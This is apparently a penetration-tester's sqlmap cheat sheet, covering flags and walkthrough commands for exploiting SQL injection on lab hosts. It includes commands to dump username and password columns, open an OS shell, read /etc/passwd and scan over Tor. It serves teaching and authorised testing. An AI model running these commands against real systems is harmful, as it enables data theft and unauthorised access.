```bash
sqlmap -r REQUEST_FILE # copy request from burp and save it then send it to sqlmap


# risk 3 search more detailed
sqlmap -u "http://shoppy.htb/login" --data "username=admin&password=admin" --risk 3 --level 5 -f --banner --ignore-code 401 --dbms='SQL_TYPE'


sqlmap (http://[ip]/admin?user=3) --cookie token=[Enter Cookie] --technique=U --delay=2 -dump
```

you can add * to tell sqlmap that this place is injectable in the file request 
```
sqlmap -r REQUEST_FILE --force ssl # FOR HTTPS --risk 3 --level 5 --batch
```

# Flags

```bash
--technique=TECH # for the type of the attack
# for example Boolean or Union attack techniques 
U # Union attack
B # Boolean attack
E # Error based

-p # pramater 
--risk --level # more aggresive attack
-u # <URL>
--dbms=SQL_TYPE # Type of database
--tor # anonymous scan
-v  --fresh-queries # Show sqlmap used payload
--banner or -b # banner 
--ignore-code # Ignore statusu code 
--cookie # add cookie value 
-r # Read from request file
--force ssl # For https 
--data # Login info
--flush-session # delete saved info about old tests
--batch # never ask for user input and use defaults
```

# Flags after finding injectable parameter
**Multiple flags should be used together**
```bash

--tables # Show tables 
--current-db DATABASE_NAME - columns # Show colums for database DATABASE_NAME
--dbs # Show databases
--tables # Show tables
--columns # Show columns
-D # Choose database 
-T # Choose table
-C # Choose column
--dump # dump database
--current-db --dump # dump current used database
--os-shell # Gain shell 

--file-read= # If you have File permision on the target u can read files from the system
--privilege # Checks ur permisions on the target

```




# Attack example 

```bash
sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique U # Check if the website is vulnerable 

sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique U -v3 --fresh-queries # SHow used payload

sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique U -dbs #Show databases

sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique U -D blogdb --tables # Show tables for blogdb database

sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique U -D blogdb -T users --columns # Show columns 

sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique U -D blogdb -T users -C username,password --dump # Dumps content of columns username and password

```

# For time based 

```bash
sqlmap -r login.req --risk 3 --level 5 --batch --technique=BEU 

sqlmap -r login.req --risk 3 --level 5 --batch --technique=BEU --privilege


```


## if we have FILE privilege 
that means we can read stuff from the system 
```bash
sqlmap -r login.req --risk 3 --level 5 --batch --technique=BEU --privilege

sqlmap -r login.req --risk 3 --level 5 --batch --technique=BEU --privilege --file-read=/etc/passwd
```